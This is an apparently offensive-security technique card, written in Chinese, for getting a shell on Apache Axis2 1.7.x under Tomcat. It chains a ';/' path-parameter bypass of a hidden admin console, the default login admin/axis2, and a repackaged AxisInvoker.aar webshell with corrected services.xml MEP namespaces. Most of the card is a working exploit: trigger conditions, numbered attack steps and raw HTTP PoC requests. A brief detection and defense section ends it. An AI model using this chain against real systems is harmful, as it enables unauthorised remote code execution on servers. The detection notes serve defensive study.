---
id: web-java-component-tomcat-axis2-17x-services-xml-mep-namespace-aar-rce
title: Axis2 1.7.x 高版本 AAR getshell：`;/` 路径参数绕过隐藏后台 + admin/axis2 弱口令 + 改 services.xml MEP 命名空间修复 info() 报错
type: scenario
domain: web
path: web/java/component/tomcat
technique: axis2-17x-aar-services-xml-mep-namespace-rce
aliases:
- Axis2 高版本 getshell
- Axis2 1.7.9 RCE
- AxisInvoker.aar
- The ServiceClass object does not implement the required method
- OMElement info(OMElement e)
- services.xml MEP 命名空间
- http://www.w3.org/ns/wsdl/in-only
- axis2;/axis2-admin
tags:
- java
- axis2
- tomcat
- web-service
- aar
- file-upload
- rce
- default-password
- path-parameter
- semicolon
- services-xml
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V697
  verified_at: '2026-11-13T18:26:38+08:00'
  notes: '已对照原文全文与 9 图核对：img01 Burp Match/replace（Type=Request header，Match=axis2/，Replace=axis2;/，分号可见）与卡内 ;/ 路径参数绕过一致；img02 直接访问 /axis2/axis2-admin/ 404、img03 替换后出现登录页、img04 admin/axis2 登录进入控制台（Tools > Upload Service）；img05 上传 AxisInvoker.aar 后 /axis2/services/AxisInvoker/info 返回 SOAP Fault ''The ServiceClass object does not implement the required method ... OMElement info(OMElement e)''；img06 Version/getversion 返回 Axis2 1.7.9；img07 AAR 内 MANIFEST.MF+services.xml（2023-07-20 修改）；img08 改 MEP 后 info 返回 user.name/user.dir: C:\Users\...\apache-tomcat-8.5.91\bin，img09 SRC 奖励。原文 1.6.2 与 1.7.4 插件 services.xml 的 MEP 命名空间差异（2004/08 vs ns/wsdl）属实。修正 1 处：2004/08 命名空间是 WSDL 2.0 2004 草案而非 WSDL 1.1，卡内已改为''2004 年草案（旧版）/定稿''表述。dedup 最高候选 web-java-component-tomcat-invoker-servlet-axisadmin-aar-upload-rce 为 related 非 duplicate：该卡走 Axis2 1.6.3 + Tomcat InvokerServlet 首/尾斜杠直调 AxisAdminServlet 且无需改 MEP，本卡走 1.7.9 的 ;/ 路径参数绕过 + 弱口令 + MEP 命名空间修复，入口/版本/关键修复不同，dedup_review 成立；dup-scan.json 无涉及本卡 pair。原文只给目标环境版本
    Axis2 1.7.9 与 1.7.4 插件样例，未标注正式受影响区间，未设 affected_versions。未验证点：未在真实环境复现，上传 POST 字段名以控制台表单为准（卡内已注明）。'
---

## 一句话结论

Axis2 1.7.x 后台上传旧版（1.6.2 插件生成）的 AAR 时，服务会因 `services.xml` 里 messageReceiver 的 MEP URI 仍是 `http://www.w3.org/2004/08/wsdl/...`、匹配不上 1.7.x 的 `http://www.w3.org/ns/wsdl/...` 而无法分发，调用时报 `The ServiceClass object does not implement the required method ... OMElement info(OMElement e)`；把 AAR 内 `services.xml` 的两处 MEP 改成 `ns/wsdl` 命名空间重新打包上传，再配合 `axis2/ → axis2;/` 的 Tomcat 路径参数绕过（本题直接访问 `/axis2/axis2-admin/` 为 404）与默认口令 `admin/axis2` 登录后台，即可调用 `/axis2/services/AxisInvoker/info` 执行命令（目标 Axis2 1.7.9 + Tomcat 8.5.91）。

## 原理

- **后台访问被隐藏时用 `;` 路径参数绕过**：直接访问 `/axis2/axis2-admin/` 返回 404（控制台被路径规则/映射隐藏），但 Tomcat 会把 URI 路径段中的 `;...` 视为路径参数并在映射前剥离；`/axis2;/axis2-admin/` 归一化为 `/axis2/axis2-admin/` 后仍命中 Axis2 控制台，而按原始 URI 字符串匹配的前置规则看不到 `/axis2/axis2-admin`，于是放行。原文用 Burp 的 Match/replace 规则把请求中的 `axis2/` 改写为 `axis2;/`（规则类型截图显示为 Request header，实际效果是请求行路径变为 `/axis2;/axis2-admin/`），刷新后从 404 变为 admin 登录页。
- **弱口令登录**：Axis2 管理控制台默认账号口令为 `admin/axis2`；原文直接用它登录 `/axis2/axis2-admin/`，进入可“Upload Service / hot-deployment”的管理界面。
- **AAR 热部署即任意服务**：控制台 Tools → Upload Service 接收 `.aar`（zip 结构，内含服务类与 `META-INF/services.xml`）并热部署为 WebService；服务类方法内可执行 `Runtime.exec` 等操作，访问 `/axis2/services/<服务名>/<操作>` 即触发，等价于 webshell。
- **高版本 MEP 命名空间变化是失败根因**：`services.xml` 的 `<messageReceivers>` 用 `mep` URI 选择消息接收器。1.6.2 插件生成的是 WSDL 2.0 2004 年草案（旧版）命名空间 `http://www.w3.org/2004/08/wsdl/in-only` 与 `.../in-out`；Axis2 1.7.x 改用 WSDL 2.0 定稿命名空间 `http://www.w3.org/ns/wsdl/in-only` 与 `.../in-out`。部署旧 AAR 时 MEP 字符串匹配不到任何接收器，Axis2 退回默认的 Java 反射分发，要求服务类实现 `OMElement info(OMElement e)` 形态的方法；AxisInvoker 的方法签名不匹配，于是返回该 SOAP fault。
- **修复方式即改配置对齐版本**：把 AAR 内 `services.xml` 的两个 `mep` 值改为 `http://www.w3.org/ns/wsdl/in-only` / `http://www.w3.org/ns/wsdl/in-out`，重新打包为 `.aar` 上传；接收器按新 MEP 匹配成功，`/axis2/services/AxisInvoker/info` 正常分发并返回命令/环境信息（原文返回 `user.name`、`user.dir: C:\Users\...\apache-tomcat-8.5.91\bin`，证明代码执行）。
- **为什么这条链可复用**：默认口令 + 后台 AAR 热部署是 Axis2 的固有攻击面；1.7.x 起旧 AAR 会因 MEP 命名空间差异“部署成功但调用失败”，报错信息固定，改 `services.xml` 的命名空间即可适配，不需要重新编译服务类。

## 触发条件

- 目标为 Axis2 1.7.x（原文 1.7.9）且运行在 Tomcat 上；`/axis2/services/Version/getversion` 可读取版本。
- Axis2 管理控制台存在（可被直接访问，或被路径规则隐藏但可用 `;` 路径参数绕过）；账号为默认/弱口令 `admin/axis2`（或已获取）。
- Upload Service（热部署）可用，`/axis2/services/*` 对外可达。
- 攻击者能准备 AAR：可用公开的 AxisInvoker.aar，或自编服务类（方法内执行命令）加 `META-INF/services.xml`。
- 针对 1.7.x，`services.xml` 的 messageReceiver MEP 必须使用 `http://www.w3.org/ns/wsdl/...` 命名空间。

## 利用步骤

1. 版本确认：`GET /axis2/services/Version/getversion`，响应 `Hi - the Axis2 version is 1.7.9`；同时确认 `/axis2/` 上下文存在。
2. 后台入口：直接访问 `/axis2/axis2-admin/` 若 404，在 Burp 加 Match/replace：`Match=axis2/`、`Replace=axis2;/`，再访问 `/axis2;/axis2-admin/`，出现登录页。
3. 登录：`admin / axis2` 进入管理控制台（Welcome to Axis2 Web Admin Module）。
4. 准备 AAR：下载 AxisInvoker.aar（GitHub Lexus89/AxisInvoker）；解压后编辑 `META-INF/services.xml`，把两处 `mep` 从 `http://www.w3.org/2004/08/wsdl/in-only|in-out` 改为 `http://www.w3.org/ns/wsdl/in-only|in-out`，其余保持（ServiceClass 指向服务类）。
5. 重新打包为 zip 并改后缀 `.aar`，在控制台 Tools → Upload Service 上传；或按后台表单直接 POST。
6. 触发：访问 `/axis2/services/AxisInvoker/info`（按服务声明的操作/SOAPAction 发请求），响应中出现 `user.name`、`user.dir` 等命令输出即 RCE 成功。
7. 若仍报 `OMElement info(OMElement e)`：确认 AAR 内 services.xml 已改且部署的是新包（删除/停用旧服务后重新上传，避免热部署缓存）。

## PoC

```text
# services.xml（1.7.x 适配后的关键片段）
<messageReceivers>
  <messageReceiver mep="http://www.w3.org/ns/wsdl/in-only"
                   class="org.apache.axis2.rpc.receivers.RPCInOnlyMessageReceiver"/>
  <messageReceiver mep="http://www.w3.org/ns/wsdl/in-out"
                   class="org.apache.axis2.rpc.receivers.RPCMessageReceiver"/>
</messageReceivers>
<parameter name="ServiceClass">com.hongbo.server.HelloServer</parameter>
```

```http
# 1) 路径参数绕过访问后台（Burp Match/replace: axis2/ -> axis2;/）
GET /axis2;/axis2-admin/ HTTP/1.1
Host: target

# 2) 默认口令登录
POST /axis2/axis2-admin/login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

userName=admin&password=axis2&submit=+Login+

# 3) 上传改过 MEP 的 AAR（字段名以控制台表单为准）
POST /axis2/axis2-admin/upload HTTP/1.1
Host: target
Cookie: JSESSIONID=<登录会话>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="filename"; filename="AxisInvoker.aar"
Content-Type: application/octet-stream

<改过 services.xml 的 aar 字节>
------X--

# 4) 触发服务
GET /axis2/services/AxisInvoker/info HTTP/1.1
Host: target
```

```text
# 预期：版本响应 1.7.9；上传后调用 info 返回
# <ns:infoResponse><ns:return>user.name: ... user.dir: ...</ns:return></ns:infoResponse>
# 修复前则返回 SOAP Fault：
# The ServiceClass object does not implement the required method ... OMElement info(OMElement e)
```

## 变体与关联

- 变体：Axis2 1.6.x 目标用旧 MEP 即可，无需改 services.xml（[[web-java-component-tomcat-invoker-servlet-axisadmin-aar-upload-rce]] 走 InvokerServlet 直调未映射的 AxisAdminServlet）。
- 变体：控制台未被隐藏时直接 `/axis2/axis2-admin/` 登录上传；口令被改则先爆破/信息泄露获取。
- 变体：`;` 路径参数绕过是 Tomcat 通用原语，除后台路径外也可绕过对 `/conf`、`.log` 的拦截（[[web-java-component-tomcat-semicolon-path-param-access-bypass]]）。
- 变体：自编 AAR 时把命令执行放在服务方法内，`services.xml` 用 `RPCMessageReceiver` 并在 `<operation>` 级别绑定接收器，适配不同 Axis2 版本的 MEP 校验。
- 边界：Axis2 1.7.x 下不改 MEP 的服务调用会稳定失败（报 `OMElement info`），改错命名空间（拼写/版本）同样失败；Upload Service 被关闭、控制台账号强口令且无泄露、`/services/*` 不可达时链路不成立。

## 检测与防御

- 检测：请求 URI 中出现 `axis2;/`、`;` 紧邻受保护路径（后台/管理端点）；对 `/axis2/axis2-admin/` 先 404 后 200 的访问；默认口令 `admin/axis2` 登录；`/axis2/axis2-admin/upload` 的 AAR 上传与随后新建服务；`/axis2/services/<新服务>/info` 等异常 SOAP 调用。
- 防御：修改 Axis2 控制台默认口令并限制来源 IP；生产环境移除 axis2-webapp 控制台或关闭 Upload Service（hot deployment）；访问控制规则先对 URI 做路径参数剥离/规范化再匹配（防 `;` 绕过）。
- 加固：升级 Axis2 并统一 services.xml 的 MEP 命名空间管理；对 AAR 上传做签名/白名单校验；WAF 规则覆盖 `;/`、`%3b` 等路径参数变体；监控管理面登录与 WebService 热部署行为。
